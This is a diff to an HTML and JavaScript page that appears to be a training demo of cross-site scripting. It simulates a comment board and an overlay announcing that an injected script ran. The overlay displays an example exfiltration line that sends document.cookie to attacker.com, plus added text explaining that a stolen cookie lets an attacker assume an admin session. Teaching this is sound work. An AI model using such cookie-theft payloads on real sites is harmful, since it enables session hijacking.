@@ -262,7 +262,7 @@
   </div>
 
   <div class="panel">
-    <div class="panel-label">// PAGE SOURCE — WHAT THE BROWSER SEES</div>
+    <div class="panel-label">// PAGE SOURCE - WHAT THE BROWSER SEES</div>
     <div class="source-view" id="source-view"><span class="src-tag">&lt;div</span> <span class="src-attr">class</span>=<span class="src-val">"comment-list"</span><span class="src-tag">&gt;</span>
   <span class="src-tag">&lt;div</span> <span class="src-attr">class</span>=<span class="src-val">"comment-item"</span><span class="src-tag">&gt;</span><span class="src-txt">Great work on Q3 targets everyone!</span><span class="src-tag">&lt;/div&gt;</span>
   <span class="src-tag">&lt;div</span> <span class="src-attr">class</span>=<span class="src-val">"comment-item"</span><span class="src-tag">&gt;</span><span class="src-txt">Reminder: patch notes for v2.1 are in the shared drive.</span><span class="src-tag">&lt;/div&gt;</span>
@@ -280,9 +280,10 @@
 <div class="xss-overlay" id="xss-overlay">
   <div class="xss-box">
     <h2>⚠ SCRIPT EXECUTED</h2>
-    <p>Your injected payload ran successfully in the browser context. Simulated session data stolen:</p>
+    <p>Your injected payload ran successfully in the browser context. An example of session data stolen by an attacker can look something like this:</p>
     <div class="stolen" id="stolen-data"></div>
-    <p style="color:var(--green);font-size:0.75rem;">🔓 Secret code unlocked — check below the comment board.</p>
+    <p>The document.cookie contains the victim's session, copying it over to the attacker they can assume the victim's role in this case (Admin)</p>
+    <p style="color:var(--green);font-size:0.75rem;">🔓 Secret code unlocked - check below the comment board.</p>
     <button class="xss-dismiss" onclick="dismissOverlay()">[ ACKNOWLEDGE ]</button>
   </div>
 </div>
@@ -290,7 +291,7 @@
 <script>
 
 document.cookie = "session_token=eyJhbGciOiJub25lIn0; path=/";
-document.cookie = "user_role=admin;; path=/";
+document.cookie = "user_role=admin; path=/";
 
 let xssTriggered = false;
 
@@ -335,7 +336,7 @@ function postComment() {
     _xssSteps.posted = true;
     _xssSteps.triggered = true;
     setTimeout(() => {
-      const fakeStolen = `document.cookie = "${document.cookie}"\nlocation.href = "https://attacker.com/steal?c=" + encodeURIComponent(document.cookie)`;
+      const fakeStolen = `document.cookie = ";${document.cookie}"\nlocation.href = "https://attacker.com/steal?c=" + encodeURIComponent(document.cookie)`;
       document.getElementById('stolen-data').textContent = fakeStolen;
       document.getElementById('xss-overlay').classList.add('show');
     }, 300);
